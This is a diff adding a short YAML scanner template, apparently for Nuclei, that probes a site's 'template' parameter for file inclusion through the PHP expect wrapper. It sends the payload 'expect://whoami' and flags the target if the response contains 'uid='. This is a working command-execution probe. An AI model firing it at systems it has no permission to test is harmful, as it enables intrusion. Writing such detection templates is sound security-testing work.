@@ -1,0 +1,20 @@
+id: lfi5-065
+name: 'Wrapper expect via template'
+severity: high
+type: active
+tags:
+  - lfi
+  - traversal
+  - wrapper
+description: 'Reads file via expect wrapper'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      template:
+        - 'expect://whoami'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'uid='
